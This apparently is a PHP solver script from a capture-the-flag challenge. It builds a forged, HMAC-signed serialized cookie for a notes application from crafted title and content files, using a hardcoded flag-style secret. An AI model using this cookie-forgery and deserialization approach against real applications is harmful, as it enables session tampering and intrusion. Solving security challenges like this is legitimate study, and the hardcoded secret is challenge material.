<?php

declare(strict_types=1);

require __DIR__ . '/../secure-mood-notes/src/main_notes_app/vendor/autoload.php';

use App\Model\Note;
use App\Model\Notes;

$secret = 'FCSC{9c3c34c030a9d6d8}';
$title = file_get_contents(__DIR__ . '/output/note_title.utf8.bin');
$content = file_get_contents(__DIR__ . '/output/note_content.utf8.bin');

if ($title === false || $content === false) {
    fwrite(STDERR, "missing input files\n");
    exit(1);
}

if (!mb_check_encoding($title, 'UTF-8') || !mb_check_encoding($content, 'UTF-8')) {
    fwrite(STDERR, "invalid utf-8 carrier\n");
    exit(1);
}

$notes = new Notes([
    0 => new Note($title, $content),
]);

$serialized = serialize($notes);
$signed = $serialized . hash_hmac('sha256', $serialized, $secret);
$cookie = urlencode(base64_encode($signed));

fwrite(STDERR, "cookie length: " . strlen($cookie) . PHP_EOL);
echo $cookie . PHP_EOL;
